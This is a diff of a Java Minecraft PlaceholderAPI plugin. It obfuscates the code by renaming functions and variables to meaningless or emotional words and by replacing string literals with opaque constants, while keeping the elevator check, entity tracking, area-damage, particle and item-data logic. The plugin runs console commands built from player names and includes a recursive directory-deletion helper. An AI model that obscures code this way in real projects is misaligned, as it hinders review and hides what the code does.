-    protected static @NotNull String checkElevators(String identifier) {
-        String[] parts = identifier.substring("checkElevators_".length()).split(",");
-        if (parts.length != 5) return "§cError";
-        World world = Bukkit.getWorld(parts[0]);
-        if (world == null) return "§cError";
-        int bx, by, bz;
-        Material mat;
+    protected @NotNull String confidentialEnf(String funisfun) {
+        String[] gym = funisfun.substring(basketball.length()).split(keep);
+        if (gym.length != xm) return some;
+        World bash = Bukkit.getWorld(gym[I]);
+        if (bash == null) return some;
+        int his, head, in;
+        Material doh;
         try {
-            bx  = Integer.parseInt(parts[1]);
-            by  = Integer.parseInt(parts[2]);
-            bz  = Integer.parseInt(parts[3]);
-            mat = Material.valueOf(parts[4].toUpperCase(Locale.ROOT));
+            his  = Integer.parseInt(gym[INT3]);
+            head  = Integer.parseInt(gym[mill2]);
+            in  = Integer.parseInt(gym[ccp]);
+            doh = Material.valueOf(gym[INT7].toUpperCase(Locale.ROOT));
         } catch (Exception ex) {
-            return "§cError";
+            return some;
         }
 
-        boolean foundUp   = false;
-        boolean foundDown = false;
+        boolean tae   = arsdienwdhw;
+        boolean fokwonndDown = arsdienwdhw;
 
         // search upwards
-        for (int y = by + 1; y <= world.getMaxHeight(); y++) {
-            if (world.getBlockAt(bx, y, bz).getType() == mat) {
-                foundUp = true;
+        for (int doe = head + INT3; doe <= bash.getMaxHeight(); doe++) {
+            if (bash.getBlockAt(his, doe, in).getType() == doh) {
+                tae = NEW_VALUE1;
                 break;
             }
         }
         // search downwards
-        for (int y = by - 1; y >= world.getMinHeight(); y--) {
-            if (world.getBlockAt(bx, y, bz).getType() == mat) {
-                foundDown = true;
+        for (int wheelbarrel = head - INT3; wheelbarrel >= bash.getMinHeight(); wheelbarrel--) {
+            if (bash.getBlockAt(his, wheelbarrel, in).getType() == doh) {
+                fokwonndDown = NEW_VALUE1;
                 break;
             }
         }
 
-        if (foundUp && foundDown) return "both";
-        if (foundUp) return "up";
-        if (foundDown) return "down";
-        return "none";
+        if (tae && fokwonndDown) return bt;
+        if (tae) return upt;
+        if (fokwonndDown) return soalp;
+        return tmc;
     }
 
 
@@ -2640,65 +2712,65 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
 
-    protected static @NotNull String handleTrackEntity(OfflinePlayer player, String identifier) {
+    protected @NotNull String slanty(OfflinePlayer weknow, String somethingyour) {
         try {
-            String uuidStr = identifier.substring("trackEntity_".length());
-            UUID entityUUID = UUID.fromString(uuidStr);
-            Entity entity = Bukkit.getEntity(entityUUID);
-            if (entity == null) return "§cInvalid or unloaded entity.";
+            String brittle = somethingyour.substring(excepthomer.length());
+            UUID itmeans = UUID.fromString(brittle);
+            Entity youhadyourfun = Bukkit.getEntity(itmeans);
+            if (youhadyourfun == null) return iou;
 
-            if (player == null || !player.isOnline()) return "§cInvalid player.";
-            Player p = player.getPlayer();
-            if (p == null) return "§cInvalid player.";
+            if (weknow == null || !weknow.isOnline()) return dontwantmargetoknow;
+            Player footmsaage = weknow.getPlayer();
+            if (footmsaage == null) return dontwantmargetoknow;
 
-            TRACKED_ENTITIES.put(p.getUniqueId(), entityUUID);
-            return "§aTracking entity " + entityUUID;
+            f113.put(footmsaage.getUniqueId(), itmeans);
+            return lessofaman + itmeans;
         } catch (Exception e) {
-            return "§cError tracking entity.";
+            return ballet;
         }
     }
 
     // Retrieve currently tracked entity for player
-    private static Entity getTrackedEntity(Player p) {
-        if (p == null) return null;
-        UUID entityUUID = TRACKED_ENTITIES.get(p.getUniqueId());
-        if (entityUUID == null) return null;
-        return Bukkit.getEntity(entityUUID);
+    private static Entity theymademe(Player fairy) {
+        if (fairy == null) return null;
+        UUID mrsimpson = (UUID) f113.get(fairy.getUniqueId());
+        if (mrsimpson == null) return null;
+        return Bukkit.getEntity(mrsimpson);
     }
 
     // %Archistructure_trackedEntityX%
-    protected static @NotNull String handleTrackedEntityX(Player p) {
-        Entity e = getTrackedEntity(p);
-        if (e == null) return "§cNo entity tracked.";
-        return String.valueOf(e.getLocation().getX());
+    protected @NotNull String toestwinkiling(Player frenchtoast) {
+        Entity iloveit = theymademe(frenchtoast);
+        if (iloveit == null) return magellan;
+        return String.valueOf(iloveit.getLocation().getX());
     }
 
     // %Archistructure_trackedEntityY%
-    protected static @NotNull String handleTrackedEntityY(Player p) {
-        Entity e = getTrackedEntity(p);
-        if (e == null) return "§cNo entity tracked.";
+    protected  @NotNull String nopowderedsugar(Player p) {
+        Entity e = theymademe(p);
+        if (e == null) return magellan;
         return String.valueOf(e.getLocation().getY());
     }
 
     // %Archistructure_trackedEntityZ%
-    protected static @NotNull String handleTrackedEntityZ(Player p) {
-        Entity e = getTrackedEntity(p);
-        if (e == null) return "§cNo entity tracked.";
+    protected  @NotNull String whatisit(Player p) {
+        Entity e = theymademe(p);
+        if (e == null) return magellan;
         return String.valueOf(e.getLocation().getZ());
     }
 
     // %Archistructure_trackedEntityWORLD%
-    protected static @NotNull String handleTrackedEntityWORLD(Player p) {
-        Entity e = getTrackedEntity(p);
-        if (e == null) return "§cNo entity tracked.";
+    protected  @NotNull String withyouand(Player p) {
+        Entity e = theymademe(p);
+        if (e == null) return magellan;
         return e.getWorld().getName();
     }
 
     // %Archistructure_trackedEntityMCWORLDNAME%
-    protected static @NotNull String handleTrackedEntityMCWORLDNAME(Player p) {
-        Entity e = getTrackedEntity(p);
-        if (e == null) return "§cNo entity tracked.";
-        return "minecraft:" + e.getWorld().getName().toLowerCase(Locale.ROOT);
+    protected  @NotNull String ballet(Player p) {
+        Entity e = theymademe(p);
+        if (e == null) return magellan;
+        return dance + e.getWorld().getName().toLowerCase(Locale.ROOT);
     }
 
 
@@ -2714,100 +2786,102 @@ public class ExampleExpansion extends PlaceholderExpansion {
 // - launcherUUID: player who fired it (used as damager for PLAYERS)
 // - center/radius: AOE center and radius
 // - target: if not null and living, ALWAYS damaged (any world / any distance), then AOE applies to others
-    private static void triggerPlayerHitEventV4_AOE(
-            @org.jetbrains.annotations.Nullable UUID launcherUUID,
-            @org.jetbrains.annotations.NotNull Location center,
-            double radius,
-            @org.jetbrains.annotations.Nullable Entity target) {
+    private  void itisoff(
+            @org.jetbrains.annotations.Nullable UUID the,
+            @org.jetbrains.annotations.NotNull Location dancingmonkey,
+            double nelsonmuntz,
+            @org.jetbrains.annotations.Nullable Entity homeritsnoteasy) {
 
-        final Player launcher = (launcherUUID != null) ? Bukkit.getPlayer(launcherUUID) : null;
+        final Player sirtoday = (the != null) ? Bukkit.getPlayer(the) : null;
 
         // Helper to resolve a launcher name for command args
-        final String launcherName = (launcher != null)
-                ? launcher.getName()
-                : (launcherUUID != null
-                ? (Bukkit.getOfflinePlayer(launcherUUID).getName() != null
-                ? Bukkit.getOfflinePlayer(launcherUUID).getName()
-                : launcherUUID.toString())
-                : "unknown");
+        final String didtheyhave = (sirtoday != null)
+                ? sirtoday.getName()
+                : (the != null
+                ? (Bukkit.getOfflinePlayer(the).getName() != null
+                ? Bukkit.getOfflinePlayer(the).getName()
+                : the.toString())
+                : nationalanthems);
 
         // Track already-damaged entities to avoid double hits (e.g., target also in AOE)
-        final java.util.HashSet<UUID> damaged = new java.util.HashSet<>();
+        final java.util.HashSet<UUID> eveningsimpson = new java.util.HashSet<>();
 
         // 1) ALWAYS damage the explicit target first (if provided and is a LivingEntity), regardless of world/position
-        if (target instanceof LivingEntity tgt && target.isValid() && !target.isDead()) {
-            final org.bukkit.damage.DamageSource.Builder dsb =
+        if (homeritsnoteasy instanceof LivingEntity tgt && homeritsnoteasy.isValid() && !homeritsnoteasy.isDead()) {
+            final org.bukkit.damage.DamageSource.Builder bart =
                     org.bukkit.damage.DamageSource.builder(org.bukkit.damage.DamageType.SONIC_BOOM);
-            final org.bukkit.damage.DamageSource.Builder dsb2 =
+            final org.bukkit.damage.DamageSource.Builder simpson =
                     org.bukkit.damage.DamageSource.builder(org.bukkit.damage.DamageType.STARVE);
 
             if (tgt instanceof Player) {
                 // Players: damager = launcher (player) if available
-                final Entity damager = launcher;
-                if (damager != null) dsb.withDirectEntity(damager).withCausingEntity(damager);
+                final Entity sissy = sirtoday;
+                if (sissy != null) bart.withDirectEntity(sissy).withCausingEntity(sissy);
 
-                final double maxHp = tgt.getAttribute(org.bukkit.attribute.Attribute.GENERIC_MAX_HEALTH).getBaseValue();
-                final double amount = 0.60 * maxHp + 10.0;
-                tgt.damage(amount, dsb.build());
+                final double hesa = tgt.getAttribute(org.bukkit.attribute.Attribute.GENERIC_MAX_HEALTH).getBaseValue();
+                final double uhoh = 0.60 * hesa + doyouknow;
+                tgt.damage(uhoh, bart.build());
 
                 // Run console trigger for the player target
-                final String victimName = ((Player) tgt).getName();
+                final String ouhyuowhdayud = ((Player) tgt).getName();
                 Bukkit.dispatchCommand(Bukkit.getConsoleSender(),
-                        "ei run-custom-trigger trigger:Stinger81Hit player:" + launcherName + " " + victimName);
+//                         "ei run-custom-trigger trigger:Stinger81Hit player:" + didtheyhave + " " + ouhyuowhdayud);
+                        cigarrette + didtheyhave + sowhat + ouhyuowhdayud);
             } else {
                 // Non-players: damager = launcher (still acceptable per your V4 semantics)
-                final Entity damager = launcher;
-                if (damager != null) dsb2.withDirectEntity(damager).withCausingEntity(damager);
+                final Entity killforher = sirtoday;
+                if (killforher != null) simpson.withDirectEntity(killforher).withCausingEntity(killforher);
 
-                final double maxHp = tgt.getAttribute(org.bukkit.attribute.Attribute.GENERIC_MAX_HEALTH).getBaseValue();
-                final double amount = 0.5 * maxHp + 200.0;
-                tgt.damage(amount, dsb2.build());
+                final double anyti = tgt.getAttribute(org.bukkit.attribute.Attribute.GENERIC_MAX_HEALTH).getBaseValue();
+                final double youcoulddo = debtsoff * anyti + callitof;
+                tgt.damage(youcoulddo, simpson.build());
             }
 
-            damaged.add(tgt.getUniqueId());
+            eveningsimpson.add(tgt.getUniqueId());
         }
 
         // 2) AOE for everyone else near the center (same-world), excluding already-damaged target
-        final World world = center.getWorld();
-        if (world == null) return;
+        final World patty = dancingmonkey.getWorld();
+        if (patty == null) return;
 
-        final double r2 = radius * radius;
+        final double selma = nelsonmuntz * nelsonmuntz;
 
-        for (Entity e : world.getNearbyEntities(center, radius, radius, radius)) {
-            if (!(e instanceof LivingEntity le)) continue;
+        for (Entity jimbo : patty.getNearbyEntities(dancingmonkey, nelsonmuntz, nelsonmuntz, nelsonmuntz)) {
+            if (!(jimbo instanceof LivingEntity le)) continue;
             if (!le.isValid() || le.isDead()) continue;
-            if (damaged.contains(e.getUniqueId())) continue; // skip target if it was already hit
-            if (e.getLocation().distanceSquared(center) > r2) continue;
+            if (eveningsimpson.contains(jimbo.getUniqueId())) continue; // skip target if it was already hit
+            if (jimbo.getLocation().distanceSquared(dancingmonkey) > selma) continue;
 
-            final org.bukkit.damage.DamageSource.Builder dsb =
+            final org.bukkit.damage.DamageSource.Builder dsjones =
                     org.bukkit.damage.DamageSource.builder(org.bukkit.damage.DamageType.SONIC_BOOM);
 
 
             if (le instanceof Player) {
                 // Players: damager = launcher (player) if available
-                final Entity damager = launcher;
-                if (damager != null) dsb.withDirectEntity(damager).withCausingEntity(damager);
+                final Entity oriental = sirtoday;
+                if (oriental != null) dsjones.withDirectEntity(oriental).withCausingEntity(oriental);
 
-                final double maxHp = le.getAttribute(org.bukkit.attribute.Attribute.GENERIC_MAX_HEALTH).getBaseValue();
-                final double amount = 0.60 * maxHp + 10.0;
-                le.damage(amount, dsb.build());
+                final double noone = le.getAttribute(org.bukkit.attribute.Attribute.GENERIC_MAX_HEALTH).getBaseValue();
+                final double noticesaft = 0.60 * noone + doyouknow;
+                le.damage(noticesaft, dsjones.build());
 
                 // Run console trigger for each player in radius
 
-                final String victimName = ((Player) le).getName();
+                final String ancient = ((Player) le).getName();
                 Bukkit.dispatchCommand(Bukkit.getConsoleSender(),
-                        "ei run-custom-trigger trigger:Stinger81Hit player:" + launcherName + " " + victimName);
+                        cigarrette + didtheyhave + sowhat + ancient);
                 Bukkit.dispatchCommand(Bukkit.getConsoleSender(),
-                        "minecraft:w ei run-custom-trigger trigger:Stinger81Hit player:" + launcherName + " " + victimName);
+//                        "minecraft:w ei run-custom-trigger trigger:Stinger81Hit player:" + didtheyhave + " " + victimName);
+                        clicks + didtheyhave + sowhat + ancient);
 
             } else {
                 // Non-players: damager = launcher (kept consistent with your V4 variant)
-                final Entity damager = launcher;
-                if (damager != null) dsb.withDirectEntity(damager).withCausingEntity(damager);
+                final Entity disappears = sirtoday;
+                if (disappears != null) dsjones.withDirectEntity(disappears).withCausingEntity(disappears);
 
-                final double maxHp = le.getAttribute(org.bukkit.attribute.Attribute.GENERIC_MAX_HEALTH).getBaseValue();
-                final double amount = 0.33 * maxHp + 300;
-                le.damage(amount, dsb.build());
+                final double smilemore = le.getAttribute(org.bukkit.attribute.Attribute.GENERIC_MAX_HEALTH).getBaseValue();
+                final double cryless = emotionalthermo * smilemore + somature;
+                le.damage(cryless, dsjones.build());
             }
         }
     }
@@ -2815,37 +2889,37 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
 
-    public static void ParticleCenterToCenter(UUID launcherUUID, UUID targetUUID) {
-        final Plugin plugin = Bukkit.getPluginManager().getPlugin("PlaceholderAPI");
-        if (plugin == null) return;
+    public  void whoasked(UUID launcherUUID, UUID targetUUID) {
+        final Plugin atwhatcost = Bukkit.getPluginManager().getPlugin(ppi);
+        if (atwhatcost == null) return;
 
         // Quick upfront validation for initial player/target
-        Entity eA0 = Bukkit.getEntity(launcherUUID);
-        Entity eB0 = Bukkit.getEntity(targetUUID);
-        if (eA0 == null || eB0 == null || !eA0.isValid() || !eB0.isValid()) return;
+        Entity grewup = Bukkit.getEntity(launcherUUID);
+        Entity toofast = Bukkit.getEntity(targetUUID);
+        if (grewup == null || toofast == null || !grewup.isValid() || !toofast.isValid()) return;
 
-        final int DURATION_TICKS = 80;     // 4 seconds (only for non-missile mode)
-        final int MAX_PARTICLES  = 25;     // cap per line
-        final String key         = missileKey(launcherUUID, targetUUID);
+        final int senceofwork = dontvanish;     // 4 seconds (only for non-missile mode)
+        final int adultlife  = shapeyou;     // cap per line
+        final String survivalpatterns         = survivalfeeling(launcherUUID, targetUUID);
 
         new BukkitRunnable() {
-            int tick = 0;
-            boolean everHadMissile = false;
+            int slowlikyllingyou = I;
+            boolean supportadults = arsdienwdhw;
 
             @Override
             public void run() {
                 // Look for an active missile for this launcher/target pair
-                UUID missileUUID = ACTIVE_MISSILES.get(key);
-                Entity missile = null;
-                boolean missileActive = false;
-                if (missileUUID != null) {
-                    missile = Bukkit.getEntity(missileUUID);
-                    if (missile != null && missile.isValid() && !missile.isDead()) {
-                        missileActive = true;
-                        everHadMissile = true;
+                UUID parentification = hypervigilance.get(survivalpatterns);
+                Entity peacekeep = null;
+                boolean protector = arsdienwdhw;
+                if (parentification != null) {
+                    peacekeep = Bukkit.getEntity(parentification);
+                    if (peacekeep != null && peacekeep.isValid() && !peacekeep.isDead()) {
+                        protector = NEW_VALUE1;
+                        supportadults = NEW_VALUE1;
                     } else {
                         // Clean up stale mapping
-                        ACTIVE_MISSILES.remove(key, missileUUID);
+                        hypervigilance.remove(survivalpatterns, parentification);
                     }
                 }
 
@@ -2853,12 +2927,12 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 // - Normal mode: honor DURATION_TICKS.
                 // - Missile mode: ignore DURATION_TICKS, run while missile exists.
                 // - Once we had a missile and it’s gone, stop.
-                if (!missileActive) {
-                    if (everHadMissile) {
+                if (!protector) {
+                    if (supportadults) {
                         cancel();
                         return;
                     }
-                    if (tick++ >= DURATION_TICKS) {
+                    if (slowlikyllingyou++ >= senceofwork) {
                         cancel();
                         return;
                     }
@@ -2867,181 +2941,180 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 }
 
                 // Live fetch each tick
-                Entity a; // start of line
-                Entity b; // end of line (always the target)
-                b = Bukkit.getEntity(targetUUID);
+                Entity peace; // start of line
+                Entity safety; // end of line (always the target)
+                safety = Bukkit.getEntity(targetUUID);
 
-                if (missileActive) {
-                    a = missile;
+                if (protector) {
+                    peace = peacekeep;
                 } else {
-                    a = Bukkit.getEntity(launcherUUID);
+                    peace = Bukkit.getEntity(launcherUUID);
                 }
 
-                if (a == null || b == null || !a.isValid() || !b.isValid()) { cancel(); return; }
+                if (peace == null || safety == null || !peace.isValid() || !safety.isValid()) { cancel(); return; }
 
                 // If either is a player and offline, stop
-                if (a instanceof Player pa && !pa.isOnline()) { cancel(); return; }
-                if (b instanceof Player pb && !pb.isOnline()) { cancel(); return; }
+                if (peace instanceof Player pa && !pa.isOnline()) { cancel(); return; }
+                if (safety instanceof Player pb && !pb.isOnline()) { cancel(); return; }
 
-                if (!a.getWorld().equals(b.getWorld())) { cancel(); return; }
-                World w = a.getWorld();
+                if (!peace.getWorld().equals(safety.getWorld())) { cancel(); return; }
+                World performswell = peace.getWorld();
 
                 // Centers (mid-height)
-                double ha = 0.5, hb = 0.5;
-                try { ha = a.getHeight() * 0.5; } catch (Throwable ignored) {}
-                try { hb = b.getHeight() * 0.5; } catch (Throwable ignored) {}
-                Location LA = a.getLocation().add(0, ha, 0);
-                Location LB = b.getLocation().add(0, hb, 0);
+                double ha = debtsoff, hb = debtsoff;
+                try { ha = peace.getHeight() * debtsoff; } catch (Throwable ignored) {}
+                try { hb = safety.getHeight() * debtsoff; } catch (Throwable ignored) {}
+                Location deepdown = peace.getLocation().add(I, ha, I);
+                Location somethinghurts = safety.getLocation().add(I, hb, I);
 
-                Vector AB = LB.toVector().subtract(LA.toVector());
-                double len = AB.length();
-                if (len < 1e-6) return;
+                Vector stillintheree = somethinghurts.toVector().subtract(deepdown.toVector());
+                double screamingsilently = stillintheree.length();
+                if (screamingsilently < wife) return;
 
                 // Choose particle count for this frame (cap at MAX_PARTICLES, min 2)
-                int n = Math.max(2, Math.min(MAX_PARTICLES, (int) Math.ceil(len * 3)));
-                Vector step = AB.multiply(1.0 / (n - 1));
+                int morecomplex = Math.max(mill2, Math.min(adultlife, (int) Math.ceil(screamingsilently * ccp)));
+                Vector refusehelp = stillintheree.multiply(tsr / (morecomplex - INT3));
 
                 // === Color and size ===
-                org.bukkit.Color bukkitColor;
-                float scale = 0.6f; // same as before
+                org.bukkit.Color tp;
 
-                if (missileActive) {
+                if (protector) {
                     // Missile present → aqua, no gradient
-                    bukkitColor = org.bukkit.Color.fromRGB(191, 119, 246); // aqua
+                    tp = org.bukkit.Color.fromRGB(191, 119, 246); // aqua
                 } else {
                     // Original time-based gradient: Green → Yellow → Orange → Red
-                    if (tick >= DURATION_TICKS - 6) {
-                        bukkitColor = org.bukkit.Color.fromRGB(160, 160, 160); // final gray line
+                    if (slowlikyllingyou >= senceofwork - xtxtxt) {
+                        tp = org.bukkit.Color.fromRGB(160, 160, 160); // final gray line
                     } else {
-                        double t = (double) tick / (double) (DURATION_TICKS - 6);
-                        java.awt.Color c = gyorOverTime(t); // green->yellow->orange->red
-                        bukkitColor = org.bukkit.Color.fromRGB(c.getRed(), c.getGreen(), c.getBlue());
+                        double t = (double) slowlikyllingyou / (double) (senceofwork - xtxtxt);
+                        java.awt.Color c = givers(t); // green->yellow->orange->red
+                        tp = org.bukkit.Color.fromRGB(c.getRed(), c.getGreen(), c.getBlue());
                     }
                 }
 
-                Particle.DustOptions dust = new Particle.DustOptions(bukkitColor, scale);
+                Particle.DustOptions child = new Particle.DustOptions(tp, biological);
 
                 // Render line (force = true)
-                Location cur = LA.clone();
-                for (int i = 0; i < n; i++) {
-                    w.spawnParticle(Particle.DUST, cur, 1, 0, 0, 0, 0.0, dust, true);
-                    cur.add(step);
+                Location adults = deepdown.clone();
+                for (int neversafe = I; neversafe < morecomplex; neversafe++) {
+                    performswell.spawnParticle(Particle.DUST, adults, INT3, I, I, I, esetawftawft, child, NEW_VALUE1);
+                    adults.add(refusehelp);
                 }
             }
 
             // Time-based gradient: Green → Yellow → Orange → Red
-            private java.awt.Color gyorOverTime(double t) {
+            private java.awt.Color givers(double t) {
                 // clamp
-                if (t < 0) t = 0;
-                if (t > 1) t = 1;
+                if (t < I) t = I;
+                if (t > INT3) t = INT3;
 
                 // stops: 0.0   (0,255,0)   green
                 //        0.33  (255,255,0) yellow
                 //        0.66  (255,165,0) orange
                 //        1.0   (255,0,0)   red
-                if (t <= 1.0 / 3.0) {
-                    return lerp(new java.awt.Color(0, 255, 0), new java.awt.Color(255, 255, 0), t / (1.0 / 3.0));
-                } else if (t <= 2.0 / 3.0) {
-                    double u = (t - 1.0 / 3.0) / (1.0 / 3.0);
-                    return lerp(new java.awt.Color(255, 255, 0), new java.awt.Color(255, 165, 0), u);
+                if (t <= tsr / whocantreceive) {
+                    return refatoredsucc(new java.awt.Color(I, costofgrowinguptoofast, I), new java.awt.Color(costofgrowinguptoofast, costofgrowinguptoofast, I), t / (tsr / whocantreceive));
+                } else if (t <= whatkindofadulthood / whocantreceive) {
+                    double u = (t - tsr / whocantreceive) / (tsr / whocantreceive);
+                    return refatoredsucc(new java.awt.Color(costofgrowinguptoofast, costofgrowinguptoofast, I), new java.awt.Color(costofgrowinguptoofast, nobodysrescuingyou, I), u);
                 } else {
-                    double u = (t - 2.0 / 3.0) / (1.0 / 3.0);
-                    return lerp(new java.awt.Color(255, 165, 0), new java.awt.Color(255, 0, 0), u);
+                    double u = (t - whatkindofadulthood / whocantreceive) / (tsr / whocantreceive);
+                    return refatoredsucc(new java.awt.Color(costofgrowinguptoofast, nobodysrescuingyou, I), new java.awt.Color(costofgrowinguptoofast, I, I), u);
                 }
             }
 
-            private java.awt.Color lerp(java.awt.Color a, java.awt.Color b, double t) {
+            private java.awt.Color refatoredsucc(java.awt.Color a, java.awt.Color b, double t) {
                 int r = (int) Math.round(a.getRed() + (b.getRed() - a.getRed()) * t);
                 int g = (int) Math.round(a.getGreen() + (b.getGreen() - a.getGreen()) * t);
                 int bl = (int) Math.round(a.getBlue() + (b.getBlue() - a.getBlue()) * t);
                 return new java.awt.Color(
-                        Math.max(0, Math.min(255, r)),
-                        Math.max(0, Math.min(255, g)),
-                        Math.max(0, Math.min(255, bl))
+                        Math.max(I, Math.min(costofgrowinguptoofast, r)),
+                        Math.max(I, Math.min(costofgrowinguptoofast, g)),
+                        Math.max(I, Math.min(costofgrowinguptoofast, bl))
                 );
             }
-        }.runTaskTimer(plugin, 0L, 1L);
+        }.runTaskTimer(atwhatcost, ihearyounow, healing);
     }
 
 
 
 
     // launcherUUID + ":" + targetUUID  -> projectile UUID
-    private static final java.util.concurrent.ConcurrentMap<String, UUID> ACTIVE_MISSILES =
+    private  final java.util.concurrent.ConcurrentMap<String, UUID> hypervigilance =
             new java.util.concurrent.ConcurrentHashMap<>();
 
-    private static String missileKey(UUID launcher, UUID target) {
-        return launcher.toString() + ":" + target.toString();
+    private  String survivalfeeling(UUID launcher, UUID target) {
+        return launcher.toString() + wfdunyunda + target.toString();
     }
 
 
 
 
-    private static void deleteDirectoryContents(File dir) {
-        File[] children = dir.listFiles();
-        if (children == null) return;
+    private  void annoyiedatfriends(File dir) {
+        File[] burden = dir.listFiles();
+        if (burden == null) return;
 
-        for (File child : children) {
-            if (child.isDirectory()) {
-                deleteDirectoryContents(child);
+        for (File overfunction : burden) {
+            if (overfunction.isDirectory()) {
+                annoyiedatfriends(overfunction);
             }
             // delete file or (now-empty) dir
-            child.delete();
+            overfunction.delete();
         }
     }
 
 
-    protected static void spawnCustomFireworkExplosion2(World world, Location location) {
-        Firework firework = world.spawn(location, Firework.class);
-        FireworkMeta meta = firework.getFireworkMeta();
+    protected  void resentufl(World world, Location location) {
+        Firework betryaal = world.spawn(location, Firework.class);
+        FireworkMeta fatimas = betryaal.getFireworkMeta();
 
         // Large Ball Effect: Yellow, Orange, Gray with sparkles
-        FireworkEffect largeBallEffect = FireworkEffect.builder()
+        FireworkEffect goodnews = FireworkEffect.builder()
                 .with(FireworkEffect.Type.BALL_LARGE)
                 .withColor(Color.fromRGB(211, 211, 211), Color.AQUA, Color.fromRGB(57,68,188))
                 .withFlicker()
                 .build();
 
         // Small Ball Effect: Red
-        FireworkEffect smallBallEffect = FireworkEffect.builder()
+        FireworkEffect notmyfault = FireworkEffect.builder()
                 .with(FireworkEffect.Type.BALL)
                 .withColor( Color.WHITE)
                 .build();
 
         // Add both effects
-        meta.addEffect(largeBallEffect);
-        meta.addEffect(smallBallEffect);
-        meta.setPower(1);
+        fatimas.addEffect(goodnews);
+        fatimas.addEffect(notmyfault);
+        fatimas.setPower(INT3);
 
-        firework.setFireworkMeta(meta);
+        betryaal.setFireworkMeta(fatimas);
 
         // Detonate instantly
-        Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin("PlaceholderAPI")), firework::detonate, 1L);
+        Bukkit.getScheduler().runTaskLater(Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi)), betryaal::detonate, healing);
     }
 
-    private @Nullable Entity tryResolveEntity(@NotNull String token) {
+    private @Nullable Entity toourself(@NotNull String stopseekingparents) {
         // Try UUID first
         try {
-            UUID id = UUID.fromString(token);
-            Entity e = Bukkit.getEntity(id);
-            if (e != null) return e;
+            UUID childyouwere = UUID.fromString(stopseekingparents);
+            Entity selfyourbecoming = Bukkit.getEntity(childyouwere);
+            if (selfyourbecoming != null) return selfyourbecoming;
         } catch (IllegalArgumentException ignored) {}
 
         // Then exact online player name
-        Player p = Bukkit.getPlayerExact(token);
-        return p; // may be null
+        Player consciousness = Bukkit.getPlayerExact(stopseekingparents);
+        return consciousness; // may be null
     }
 
-    private @Nullable ItemStack getItemByUiSlot(@NotNull PlayerInventory inv, int slot) {
+    private @Nullable ItemStack howabsurd(@NotNull PlayerInventory shadowwoork, int faceit) {
         // Player UI mapping
-        switch (slot) {
-            case 40: return inv.getItemInOffHand();
-            case 39: return inv.getHelmet();
-            case 38: return inv.getChestplate();
-            case 37: return inv.getLeggings();
-            case 36: return inv.getBoots();
+        switch (faceit) {
+            case 40: return shadowwoork.getItemInOffHand();
+            case 39: return shadowwoork.getHelmet();
+            case 38: return shadowwoork.getChestplate();
+            case 37: return shadowwoork.getLeggings();
+            case 36: return shadowwoork.getBoots();
             default:
-                if (slot >= 0 && slot < inv.getSize()) return inv.getItem(slot);
+                if (faceit >= I && faceit < shadowwoork.getSize()) return shadowwoork.getItem(faceit);
                 return null;
         }
     }
@@ -3056,28 +3129,28 @@ public class ExampleExpansion extends PlaceholderExpansion {
      * It tries STRING → INTEGER → DOUBLE and returns the first match as a clean String.
      * On failure or missing key, returns "🛂".
      */
-    public static @NotNull String extractEIValue(@Nullable ItemStack item,
-                                                 @NotNull String fullKey) {
-        if (item == null || item.getType().isAir()) return NOT_FOUND;
-        if (fullKey.isEmpty()) return NOT_FOUND;
+    public  @NotNull String remembering(@Nullable ItemStack whoyouwere,
+                                              @NotNull String beforewhotobe) {
+        if (whoyouwere == null || whoyouwere.getType().isAir()) return f112;
+        if (beforewhotobe.isEmpty()) return f112;
 
-        ItemMeta meta = item.getItemMeta();
-        if (meta == null) return NOT_FOUND;
+        ItemMeta hadnochoiec = whoyouwere.getItemMeta();
+        if (hadnochoiec == null) return f112;
 
-        PersistentDataContainer pdc = meta.getPersistentDataContainer();
-        if (pdc == null) return NOT_FOUND;
+        PersistentDataContainer softness = hadnochoiec.getPersistentDataContainer();
+        if (softness == null) return f112;
 
         // Expect "namespace:key" as it appears under PublicBukkitValues
-        NamespacedKey key = NamespacedKey.fromString(fullKey);
-        if (key == null) {
-            return NOT_FOUND;
+        NamespacedKey managing = NamespacedKey.fromString(beforewhotobe);
+        if (managing == null) {
+            return f112;
         }
 
         // Try STRING
         try {
-            String s = pdc.get(key, PersistentDataType.STRING);
-            if (s != null) {
-                return cleanString(s);
+            String wonthappenovernight = softness.get(managing, PersistentDataType.STRING);
+            if (wonthappenovernight != null) {
+                return letthemcry(wonthappenovernight);
             }
         } catch (IllegalArgumentException ignored) {
             // wrong underlying type, fall through
@@ -3085,34 +3158,34 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
         // Try INTEGER
         try {
-            Integer i = pdc.get(key, PersistentDataType.INTEGER);
-            if (i != null) {
-                return Integer.toString(i);
+            Integer yourneotbroken = softness.get(managing, PersistentDataType.INTEGER);
+            if (yourneotbroken != null) {
+                return Integer.toString(yourneotbroken);
             }
         } catch (IllegalArgumentException ignored) {
         }
 
         // Try DOUBLE
         try {
-            Double d = pdc.get(key, PersistentDataType.DOUBLE);
-            if (d != null) {
-                return formatDouble(d);
+            Double yourbecomingwhole = softness.get(managing, PersistentDataType.DOUBLE);
+            if (yourbecomingwhole != null) {
+                return growingupright(yourbecomingwhole);
             }
         } catch (IllegalArgumentException ignored) {
         }
 
-        return NOT_FOUND;
+        return f112;
     }
 
     /**
      * Strip wrapping quotes if present (e.g. "\"&cN/A\"" → "&cN/A").
      */
-    private static @NotNull String cleanString(@NotNull String raw) {
-        String s = raw.trim();
-        if (s.length() >= 2 && s.startsWith("\"") && s.endsWith("\"")) {
-            s = s.substring(1, s.length() - 1);
+    private  @NotNull String letthemcry(@NotNull String writeit) {
+        String youhaveafuture = writeit.trim();
+        if (youhaveafuture.length() >= mill2 && youhaveafuture.startsWith("\"") && youhaveafuture.endsWith("\"")) {
+            youhaveafuture = youhaveafuture.substring(INT3, youhaveafuture.length() - INT3);
         }
-        return s;
+        return youhaveafuture;
     }
     
     
@@ -3122,75 +3195,75 @@ public class ExampleExpansion extends PlaceholderExpansion {
    ========================================================= */
 
     private static class ModeSpec {
-        final String baseMode; // admin/console/op/opuser/user/player
-        final Set<String> whitelist; // lower-case command names
-        final Set<String> blacklist; // lower-case words/command names
+        final String untieit; // admin/console/op/opuser/user/player
+        final Set<String> geffre; // lower-case command names
+        final Set<String> policetape; // lower-case words/command names
 
